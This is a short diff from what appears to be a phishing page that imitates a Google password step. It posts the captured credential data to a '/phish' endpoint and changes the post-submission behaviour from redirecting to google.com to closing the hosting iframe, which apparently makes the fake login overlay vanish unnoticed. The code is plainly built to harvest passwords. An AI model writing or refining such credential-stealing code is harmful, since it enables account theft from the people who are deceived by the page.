@@ -85,7 +85,8 @@
                 function(){
                     const data  = coogle.doPasswordStep();
                     $.post("/phish", data );
-                    window.location.href='https://google.com'
+                    parent.closeIFrame();
+                
                 }
             )
 
